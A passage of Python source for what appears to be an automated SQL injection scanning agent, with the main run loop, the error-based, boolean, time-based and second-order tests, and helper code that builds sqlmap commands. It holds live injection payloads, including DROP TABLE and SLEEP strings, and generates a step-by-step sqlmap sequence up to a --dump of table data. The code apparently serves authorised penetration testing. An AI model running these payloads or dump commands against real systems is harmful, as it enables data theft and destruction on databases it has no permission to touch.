        # Payloads designed to be stored and executed later
        second_order_payloads = [
            "admin'-- ",
            "' OR '1'='1'-- ",
            "test'; DROP TABLE test;-- ",
            "test' UNION SELECT 1,2,3-- ",
        ]

        base_url = self._get_base_url()

        for payload in second_order_payloads:
            try:
                # Step 1: Inject the payload
                inject_url = self._build_url_with_param(base_url, injection_param, payload)
                async with session.get(inject_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    await resp.text()

                # Step 2: Check observation points for SQL errors
                for obs_url in self.observation_points:
                    async with session.get(obs_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        content = await resp.text()

                        error_info = self._extract_info_from_error(content)

                        if error_info.get("db_type") or error_info.get("tables_leaked"):
                            logger.info(f"[{self.name}] 🎯 Second-Order SQLi detected!")
                            return {
                                "type": "SQLI",
                                "subtype": "Second-Order",
                                "url": self.url,
                                "injection_point": f"{injection_url}?{injection_param}",
                                "trigger_point": obs_url,
                                "parameter": injection_param,
                                "payload": payload,
                                "technique": "second_order",
                                "evidence": {
                                    "sql_error_visible": True,
                                    **error_info
                                },
                                "severity": "CRITICAL",
                                "validated": True,
                                "status": "VALIDATED_CONFIRMED",
                                "description": f"Second-Order SQL Injection confirmed. Payload injected at '{injection_param}' triggers error at '{obs_url}'. DB: {error_info.get('db_type', 'unknown')}",
                                "reproduction": f"# Step 1: Inject payload\ncurl '{inject_url}'\n# Step 2: Trigger at observation point\ncurl '{obs_url}'"
                            }
            except Exception as e:
                logger.debug(f"Second-order test failed: {e}")

        return None

    # =========================================================================
    # PREPARED STATEMENT DETECTION (EARLY EXIT)
    # =========================================================================

    async def _detect_prepared_statements(
        self, session: aiohttp.ClientSession, param: str
    ) -> bool:
        """
        Detect if the application likely uses prepared statements.
        If responses to multiple SQLi payloads are identical, it's probably safe.
        """
        base_url = self._get_base_url()
        responses = []

        test_payloads = [
            "1",           # Normal
            "1'",          # Single quote
            "1' OR '1'='1",  # Classic SQLi
            "1; DROP TABLE test",  # Stacked
            "1 UNION SELECT 1",    # Union
        ]

        for payload in test_payloads:
            try:
                test_url = self._build_url_with_param(base_url, param, payload)
                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    content = await resp.text()
                    # Normalize response (remove dynamic parts)
                    normalized = re.sub(r'\d{4}-\d{2}-\d{2}', 'DATE', content)
                    normalized = re.sub(r'\d{2}:\d{2}:\d{2}', 'TIME', normalized)
                    normalized = re.sub(r'[a-f0-9]{32}', 'HASH', normalized)
                    responses.append(normalized[:1000])
            except Exception as e:
                responses.append("")

        # If all responses are very similar (>95% match) and no SQL errors
        if len(set(responses)) == 1 or len(responses) < 3:
            has_sql_error = any(
                self._extract_info_from_error(r).get("db_type")
                for r in responses
            )
            if not has_sql_error:
                self._stats["prepared_statement_exits"] += 1
                logger.info(f"[{self.name}] 🛡️ Likely uses prepared statements, skipping {param}")
                return True

        return False

    # =========================================================================
    # SQLMAP REPRODUCTION COMMANDS
    # =========================================================================

    def _build_full_sqlmap_command(
        self, param: str, technique: str, db_type: Optional[str] = None,
        tamper: Optional[str] = None, extra_options: Dict = None
    ) -> str:
        """
        Build complete SQLMap command for reproduction.
        """
        # Map technique to SQLMap code
        technique_map = {
            "error_based": "E",
            "boolean_based": "B",
            "union_based": "U",
            "stacked": "S",
            "time_based": "T",
            "oob": "E",  # OOB uses error-based techniques
        }
        tech_code = technique_map.get(technique, "BEUS")

        cmd_parts = [
            f"sqlmap -u '{self.url}'",
            "--batch",
            f"-p {param}",
            f"--technique={tech_code}",
        ]

        # Add DB-specific options
        if db_type:
            cmd_parts.append(f"--dbms={db_type.lower()}")

        # Add tamper scripts
        if tamper:
            cmd_parts.append(f"--tamper={tamper}")
        elif self._detected_filters:
            # Auto-suggest tampers based on detected filters
            suggested_tampers = []
            if " " in self._detected_filters:
                suggested_tampers.append("space2comment")
            if "'" in self._detected_filters:
                suggested_tampers.append("apostrophemask")
            if "OR" in self._detected_filters or "AND" in self._detected_filters:
                suggested_tampers.append("randomcase")
            if suggested_tampers:
                cmd_parts.append(f"--tamper={','.join(suggested_tampers)}")

        # Add cookies if present
        if self.cookies:
            cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in self.cookies])
            cmd_parts.append(f"--cookie='{cookie_str}'")

        # Add headers if present
        for name, value in self.headers.items():
            cmd_parts.append(f"--header='{name}: {value}'")

        # Add extra options
        if extra_options:
            for key, value in extra_options.items():
                cmd_parts.append(f"--{key}={value}" if value else f"--{key}")

        return " \\\n  ".join(cmd_parts)

    def _build_progressive_sqlmap_commands(
        self, param: str, technique: str, db_type: Optional[str] = None
    ) -> List[Dict[str, str]]:
        """
        Build progressive SQLMap commands for exploitation.
        """
        base_cmd = self._build_full_sqlmap_command(param, technique, db_type)

        return [
            {
                "step": "1. Confirm vulnerability",
                "command": base_cmd,
                "description": "Verify the SQL injection is exploitable"
            },
            {
                "step": "2. List databases",
                "command": base_cmd + " \\\n  --dbs",
                "description": "Enumerate all databases on the server"
            },
            {
                "step": "3. List tables",
                "command": base_cmd + " \\\n  -D <DATABASE_NAME> --tables",
                "description": "List tables in a specific database"
            },
            {
                "step": "4. List columns",
                "command": base_cmd + " \\\n  -D <DATABASE_NAME> -T <TABLE_NAME> --columns",
                "description": "List columns in a specific table"
            },
            {
                "step": "5. Extract data (CAREFUL!)",
                "command": base_cmd + " \\\n  -D <DATABASE_NAME> -T <TABLE_NAME> --dump",
                "description": "Extract data from a table (use with caution in production)"
            },
        ]

    # =========================================================================
    # LLM EXPLOITATION EXPLANATION
    # =========================================================================

    async def _generate_llm_exploitation_explanation(self, finding: Any) -> str:
        """
        Generate professional exploitation explanation using LLM.
        """
        try:
            from bugtrace.core.llm_client import llm_client

            system_prompt = """You are a senior penetration tester writing a professional vulnerability report.
Write a concise but thorough explanation of this SQL injection vulnerability for a security triager.

Include:
1. Brief explanation of the vulnerability type
2. Potential impact (data theft, authentication bypass, etc.)
3. Affected data/tables if known
4. Remediation recommendation

Keep it professional and factual. Do not include actual exploit code."""

            # Handle both Dict and SQLiFinding object
            if isinstance(finding, dict):
                url = finding.get('url')
                param = finding.get('parameter')
                technique = finding.get('technique', 'Unknown')
                db_type = finding.get('evidence', {}).get('db_type', 'Unknown')
                tables = finding.get('evidence', {}).get('tables_leaked', [])
                columns = finding.get('evidence', {}).get('columns_leaked', [])
            else:
                url = finding.url
                param = finding.parameter
                technique = finding.injection_type
                db_type = finding.dbms_detected
                tables = finding.extracted_tables
                columns = finding.columns_detected

            user_prompt = f"""SQL Injection Finding:
- URL: {url}
- Parameter: {param}
- Technique: {technique}
- Database Type: {db_type}
- Tables Leaked: {tables}
- Columns Leaked: {columns}

Write the exploitation explanation section for the report."""

            response = await llm_client.generate(
                prompt=user_prompt,
                system_prompt=system_prompt,
                module_name="SQLi_Explanation",
                max_tokens=500,
                temperature=0.3
            )

            return response.strip() if response else ""

        except Exception as e:
            logger.debug(f"LLM explanation failed: {e}")
            return ""

    # =========================================================================
    # MAIN RUN LOOP
    # =========================================================================

    async def run_loop(self) -> Dict:
        """
        Multi-phase SQLi detection and validation.

        Phases:
        1. Initialize & baseline
        2. Filter detection
        3. High-priority parameter testing
        4. OOB SQLi testing
        5. Error-based / Boolean-based testing
        6. Time-based verification (only if needed)
        7. JSON body injection
        8. Second-order SQLi (if observation points provided)
        9. SQLMap fallback
        """
        dashboard.current_agent = self.name
        dashboard.log(f"[{self.name}] 🔍 Starting SQLi v3 scan on {self.url}", "INFO")

        findings = []

        async with aiohttp.ClientSession() as session:
            # Add cookies/headers
            if self.cookies:
                cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in self.cookies])
                session.cookie_jar.update_cookies({"Cookie": cookie_str})

            try:
                # =============================================================
                # PHASE 1: Initialize & Baseline
                # =============================================================
                dashboard.log(f"[{self.name}] Phase 1: Initializing...", "INFO")

                # Get baseline response
                try:
                    start = time.time()
                    async with session.get(self.url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        baseline_content = await resp.text()
                        self._baseline_response_time = time.time() - start
                        self._baseline_content_length = len(baseline_content)

                        # Try to detect DB from baseline errors
                        self._detected_db_type = self._detect_database_type(baseline_content)
                except Exception as e:
                    logger.warning(f"Baseline failed: {e}")

                # Initialize Interactsh for OOB
                await self._init_interactsh()

                # =============================================================
                # PHASE 2: Extract and prioritize parameters
                # =============================================================
                parsed = urlparse(self.url)
                params = list(parse_qs(parsed.query).keys())

                # Add specific param if provided
                if self.param and self.param not in params:
                    params.insert(0, self.param)

                # Add POST params if provided
                if self.post_data:
                    post_params = self._extract_post_params(self.post_data)
                    params.extend(post_params)

                # Prioritize
                params = self._prioritize_params(list(set(params)))

                if not params:
                    params = ["id"]  # Sensible fallback

                dashboard.log(f"[{self.name}] Testing {len(params)} parameters (prioritized)", "INFO")

                # =============================================================
                # PHASE 3: Per-parameter testing
                # =============================================================
                for param in params:
                    if self._max_impact_achieved:
                        dashboard.log(f"[{self.name}] 🏆 Max impact achieved, stopping", "SUCCESS")
                        break

                    if param in self._tested_params:
                        continue

                    self._tested_params.add(param)
                    self._stats["params_tested"] += 1

                    dashboard.log(f"[{self.name}] Testing: {param}", "INFO")

                    # ---------------------------------------------------------
                    # Phase 3.1: Detect prepared statements (early exit)
                    # ---------------------------------------------------------
                    if await self._detect_prepared_statements(session, param):
                        continue

                    # ---------------------------------------------------------
                    # Phase 3.2: Detect filtered characters
                    # ---------------------------------------------------------
                    await self._detect_filtered_chars(session, param)

                    # ---------------------------------------------------------
                    # Phase 3.3: OOB SQLi (most reliable for blind)
                    # ---------------------------------------------------------
                    if self._interactsh:
                        oob_finding = await self._test_oob_sqli(session, param)
                        if oob_finding:
                            # Generate LLM explanation
                            oob_finding.exploitation_explanation = await self._generate_llm_exploitation_explanation(oob_finding)
                            findings.append(self._finding_to_dict(oob_finding))
                            self._stats["vulns_found"] += 1

                            should_stop, reason = self._should_stop_testing("oob", oob_finding.evidence, len(findings))
                            if should_stop:
                                dashboard.log(f"[{self.name}] {reason}", "SUCCESS")
                                break
                            continue

                    # ---------------------------------------------------------
                    # Phase 3.4: Error-based / Boolean-based testing
                    # ---------------------------------------------------------
                    error_finding = await self._test_error_based(session, param)
                    if error_finding:
                        error_finding.exploitation_explanation = await self._generate_llm_exploitation_explanation(error_finding)
                        findings.append(self._finding_to_dict(error_finding))
                        self._stats["vulns_found"] += 1

                        should_stop, reason = self._should_stop_testing("error_based", error_finding.evidence, len(findings))
                        if should_stop:
                            dashboard.log(f"[{self.name}] {reason}", "SUCCESS")
                            break
                        continue

                    boolean_finding = await self._test_boolean_based(session, param)
                    if boolean_finding:
                        boolean_finding.exploitation_explanation = await self._generate_llm_exploitation_explanation(boolean_finding)
                        findings.append(self._finding_to_dict(boolean_finding))
                        self._stats["vulns_found"] += 1

                        should_stop, reason = self._should_stop_testing("boolean_based", boolean_finding.evidence, len(findings))
                        if should_stop:
                            dashboard.log(f"[{self.name}] {reason}", "SUCCESS")
                            break
                        continue

                    # ---------------------------------------------------------
                    # Phase 3.5: Time-based (only with triple verification)
                    # ---------------------------------------------------------
                    time_payloads = [
                        "' AND SLEEP(5)-- ",
                        "' OR SLEEP(5)-- ",
                        "'; WAITFOR DELAY '0:0:5'-- ",
                        "' AND pg_sleep(5)-- ",
                    ]

                    for payload in time_payloads:
                        verified, evidence = await self._verify_time_based_triple(session, param, payload)
                        if verified:
                            exploit_url, exploit_url_encoded = self._build_exploit_url(self.url, param, payload)
                            curl_cmd = f"curl '{exploit_url_encoded}'"
                            
                            finding = SQLiFinding(
                                url=self.url,
                                parameter=param,
                                injection_type="time-based",
                                technique="time_based",
                                working_payload=payload,
                                payload_encoded=payload,
                                exploit_url=exploit_url,
                                exploit_url_encoded=exploit_url_encoded,
                                dbms_detected=self._detected_db_type or "unknown",
                                sqlmap_command=f"sqlmap -u '{self.url}' -p {param} --technique=T --time-sec=5 --batch",
                                curl_command=curl_cmd,
                                sqlmap_reproduce_command=f"sqlmap -u '{self.url}' -p {param} --batch --technique=T",
                                validated=True,
                                status=self._determine_validation_status("time_based", evidence),
                                evidence=evidence,
                                reproduction_steps=self._generate_repro_steps(self.url, param, payload, curl_cmd)
                            )
                            
                            finding.exploitation_explanation = await self._generate_llm_exploitation_explanation(finding)
                            findings.append(self._finding_to_dict(finding))
                            self._stats["vulns_found"] += 1
                            break

                # =============================================================
                # PHASE 4: JSON Body Injection
                # =============================================================
                if self.post_data and not self._max_impact_achieved:
                    try:
                        json_body = json.loads(self.post_data)
                        dashboard.log(f"[{self.name}] Phase 4: Testing JSON body...", "INFO")
                        json_findings = await self._test_json_body_injection(session, self.url, json_body)
                        for jf in json_findings:
                            jf.exploitation_explanation = await self._generate_llm_exploitation_explanation(jf)
                            findings.append(self._finding_to_dict(jf))
                        self._stats["vulns_found"] += len(json_findings)
                    except json.JSONDecodeError:
                        pass  # Not JSON

                # =============================================================
                # PHASE 5: Second-Order SQLi
                # =============================================================
                if self.observation_points and not self._max_impact_achieved:
                    dashboard.log(f"[{self.name}] Phase 5: Testing second-order SQLi...", "INFO")
                    for param in params[:5]:  # Test top 5 params
                        so_finding = await self._test_second_order_sqli(session, self.url, param)
                        if so_finding:
                            so_finding["exploitation_explanation"] = await self._generate_llm_exploitation_explanation(so_finding)
                            findings.append(so_finding)
                            self._stats["vulns_found"] += 1
                            break

                # =============================================================
                # PHASE 6: SQLMap Fallback (if nothing found)
                # =============================================================
                if not findings and external_tools.docker_cmd:
                    dashboard.log(f"[{self.name}] Phase 6: SQLMap fallback...", "INFO")

                    for param in params[:3]:  # Test top 3 with SQLMap
                        docker_url = self.url.replace("127.0.0.1", "172.17.0.1").replace("localhost", "172.17.0.1")

                        sqlmap_result = await external_tools.run_sqlmap(
                            docker_url,
                            target_param=param,
                            technique="BEUS"  # NO Time-based by default
                        )

                        if sqlmap_result and sqlmap_result.get("vulnerable"):
                            technique = self._sqlmap_type_to_technique(sqlmap_result.get("type", ""))
                            dbms = sqlmap_result.get("dbms", "unknown")

                            
                            details = self._parse_sqlmap_output(sqlmap_result.get("output_snippet", ""))
                            
                            # Merge details
                            dbms = details.get("dbms") if details.get("dbms") != "unknown" else sqlmap_result.get("dbms", "unknown")
                            working_payload = details.get("working_payload") or sqlmap_result.get("payload", "")
                            
                            exploit_url, exploit_url_encoded = self._build_exploit_url(self.url, param, working_payload)
                            curl_cmd = f"curl '{exploit_url_encoded}'"

                            finding = SQLiFinding(
                                url=self.url,
                                parameter=sqlmap_result.get("parameter", param),
                                injection_type=sqlmap_result.get("type", technique),
                                technique=technique,
                                working_payload=working_payload,
                                payload_encoded=working_payload,
                                exploit_url=exploit_url,
                                exploit_url_encoded=exploit_url_encoded,
                                dbms_detected=dbms,
                                columns_detected=details.get("columns_count"),
                                extracted_databases=details.get("databases", []),
                                extracted_tables=details.get("tables", []),
                                sqlmap_command=f"sqlmap -u '{self.url}' -p {param} --batch --technique={technique[0].upper()}",
                                curl_command=curl_cmd,
                                sqlmap_reproduce_command=sqlmap_result.get("reproduction_command", ""),
                                validated=True,
                                status="VALIDATED_CONFIRMED",
                                evidence={
                                    "sqlmap_confirmed": True,
                                    "db_type": dbms,
                                    "raw_output": sqlmap_result.get("output_snippet", "")[:1000]
                                },
                                reproduction_steps=self._generate_repro_steps(self.url, param, working_payload, curl_cmd)
                            )
                            
                            finding.exploitation_explanation = await self._generate_llm_exploitation_explanation(finding)
                            findings.append(self._finding_to_dict(finding))
                            self._stats["vulns_found"] += 1

                            if settings.EARLY_EXIT_ON_FINDING:
                                break

                # Log final stats
                dashboard.log(
                    f"[{self.name}] Complete: {self._stats['params_tested']} params, "
                    f"{self._stats['vulns_found']} vulns, {self._stats['oob_callbacks']} OOB callbacks",
                    "SUCCESS" if findings else "INFO"
                )

                return {
                    "vulnerable": len(findings) > 0,
                    "findings": findings,
                    "stats": self._stats
                }

            except Exception as e:
                logger.error(f"[{self.name}] SQLi scan failed: {e}", exc_info=True)
                return {"vulnerable": False, "findings": [], "error": str(e)}

    # =========================================================================
    # HELPER DETECTION METHODS
    # =========================================================================

    async def _test_error_based(self, session: aiohttp.ClientSession, param: str) -> Optional[Dict]:
        """Test for error-based SQL injection."""
        base_url = self._get_base_url()

        error_payloads = [
            "'",
            "''",
            "\"",
            "' OR '1'='1",
            "' AND '1'='2",
            "1'",
            "1\"",
            "') OR ('1'='1",
            "1; SELECT 1",
        ]

        for payload in error_payloads:
            variants = self._mutate_payload_for_filters(payload)

            for variant in variants:
                try:
                    test_url = self._build_url_with_param(base_url, param, variant)

                    async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        content = await resp.text()

                        error_info = self._extract_info_from_error(content)

                        if error_info.get("db_type"):
                            self._detected_db_type = error_info["db_type"]

                            
                            exploit_url, exploit_url_encoded = self._build_exploit_url(self.url, param, variant)
                            curl_cmd = f"curl '{exploit_url_encoded}'"
                            
                            return SQLiFinding(
                                url=self.url,
                                parameter=param,
                                injection_type="error-based",
                                technique="error_based",
                                working_payload=variant,
                                payload_encoded=variant, 
                                exploit_url=exploit_url,
                                exploit_url_encoded=exploit_url_encoded,
                                extracted_tables=error_info.get("tables_leaked", []),
                                dbms_detected=error_info.get("db_type", "unknown"),
                                sqlmap_command=f"sqlmap -u '{self.url}' -p {param} --technique=E --batch",
                                curl_command=curl_cmd,
                                sqlmap_reproduce_command=f"sqlmap -u '{self.url}' -p {param} --batch --dbs --technique=E",
                                validated=True,
                                status=self._determine_validation_status("error_based", {
                                    "sql_error_visible": True,
                                    "tables_leaked": error_info.get("tables_leaked", [])
                                }),
                                evidence={
                                    "sql_error_visible": True,
                                    **error_info
                                },
                                reproduction_steps=self._generate_repro_steps(self.url, param, variant, curl_cmd)
                            )
                except Exception as e:
                    logger.debug(f"Error-based test failed: {e}")

        return None

    async def _test_boolean_based(self, session: aiohttp.ClientSession, param: str) -> Optional[Dict]:
        """Test for boolean-based blind SQL injection."""
        import difflib

        base_url = self._get_base_url()

        try:
            # Get baseline
            baseline_url = self._build_url_with_param(base_url, param, "1")
            async with session.get(baseline_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                baseline_content = await resp.text()

            # True condition
            true_payload = "1' AND '1'='1"
            true_url = self._build_url_with_param(base_url, param, true_payload)
            async with session.get(true_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                true_content = await resp.text()

            # False condition
            false_payload = "1' AND '1'='2"
            false_url = self._build_url_with_param(base_url, param, false_payload)
            async with session.get(false_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                false_content = await resp.text()

            # Calculate similarity
            true_sim = difflib.SequenceMatcher(None, baseline_content, true_content).ratio()
            false_sim = difflib.SequenceMatcher(None, baseline_content, false_content).ratio()

            diff_ratio = abs(true_sim - false_sim)

            logger.debug(f"[{self.name}] Boolean test: true_sim={true_sim:.2f}, false_sim={false_sim:.2f}, diff={diff_ratio:.2f}")

            # If true condition matches baseline but false differs significantly
            if true_sim > 0.9 and false_sim < 0.8 and diff_ratio > 0.15:
                exploit_url, exploit_url_encoded = self._build_exploit_url(self.url, param, true_payload)
                curl_cmd = f"curl '{exploit_url_encoded}'"
                
                return SQLiFinding(
                    url=self.url,
                    parameter=param,
                    injection_type="boolean-based",
                    technique="boolean_based",
                    working_payload=true_payload,
                    payload_encoded=true_payload,
                    exploit_url=exploit_url,
                    exploit_url_encoded=exploit_url_encoded,
                    dbms_detected=self._detected_db_type or "unknown",
                    sqlmap_command=f"sqlmap -u '{self.url}' -p {param} --technique=B --batch",
                    curl_command=curl_cmd,
                    sqlmap_reproduce_command=f"sqlmap -u '{self.url}' -p {param} --batch --technique=B",
                    validated=True,
                    status=self._determine_validation_status("boolean_based", {"diff_ratio": diff_ratio}),
                    evidence={
                        "diff_ratio": diff_ratio,
                        "true_similarity": true_sim,
                        "false_similarity": false_sim,
                    },
                    reproduction_steps=self._generate_repro_steps(self.url, param, true_payload, curl_cmd)
                )
        except Exception as e:
            logger.debug(f"Boolean-based test failed: {e}")

        return None

    # =========================================================================
    # UTILITY METHODS
    # =========================================================================

    def _get_base_url(self) -> str:
        """Get base URL without query string."""
        parsed = urlparse(self.url)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    def _build_url_with_param(self, base_url: str, param: str, value: str) -> str:
        """Build URL with specific parameter value."""
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        params[param] = [value]
        new_query = urlencode(params, doseq=True)
        return f"{base_url}?{new_query}"

    def _extract_post_params(self, post_data: str) -> List[str]:
        """Extract parameter names from POST data."""
        params = []

        # URL-encoded
        if "=" in post_data:
            for pair in post_data.split("&"):
                if "=" in pair:
                    params.append(pair.split("=")[0])

        # JSON
        try:
            data = json.loads(post_data)
            if isinstance(data, dict):
                params.extend(data.keys())
        except Exception as e:
            logger.debug(f"operation failed: {e}")

        return params

    def _sqlmap_type_to_technique(self, sqlmap_type: str) -> str:
        """Convert SQLMap type to technique code."""
        sqlmap_type_lower = (sqlmap_type or "").lower()

        if "time" in sqlmap_type_lower or "sleep" in sqlmap_type_lower:
            return "time_based"
        if "error" in sqlmap_type_lower:
            return "error_based"
        if "boolean" in sqlmap_type_lower or "blind" in sqlmap_type_lower:
            return "boolean_based"
        if "union" in sqlmap_type_lower:
            return "union_based"
        if "stack" in sqlmap_type_lower:
            return "stacked"

        return "error_based"

    def _get_technique_name(self, technique: str) -> str:
        """Get human-readable technique name."""
        names = {
            "error_based": "Error-Based",
            "time_based": "Time-Based Blind",
            "boolean_based": "Boolean-Based Blind",
            "union_based": "UNION-Based",
            "stacked": "Stacked Queries",
            "oob": "Out-of-Band",
            "second_order": "Second-Order",
        }
        return names.get(technique, "Unknown")
